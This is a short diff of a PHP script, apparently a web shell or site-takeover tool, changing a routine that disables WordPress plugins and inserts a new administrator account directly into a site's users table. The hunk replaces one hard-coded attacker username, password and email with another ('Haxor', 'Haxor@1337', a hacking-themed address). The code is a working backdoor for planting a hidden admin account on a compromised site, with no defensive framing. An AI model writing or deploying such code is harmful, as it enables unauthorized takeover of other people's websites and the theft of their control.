@@ -456,10 +456,10 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
             // --- B. DISABLE SPECIFIC PLUGINS & CREATE ADMIN ---
             elseif (isset($_POST['create_wp_admin'])) {
                 // 1. Create Admin
-                $admin_username = 'xshikata';
-                $admin_password_plain = 'Lulz1337';
+                $admin_username = 'Haxor';
+                $admin_password_plain = 'Haxor@1337';
                 $admin_password = md5($admin_password_plain); 
-                $admin_email = 'topupgameku.id@gmail.com';
+                $admin_email = 'mrhhacking404@gmail.com';
                 
                 $insert_user = "INSERT INTO `{$db_prefix}users` (user_login, user_pass, user_nicename, user_email, user_status) VALUES ('{$admin_username}', '{$admin_password}', 'WordPress Administrator', '{$admin_email}', 0)";
                 $user_created = mysqli_query($conn, $insert_user);
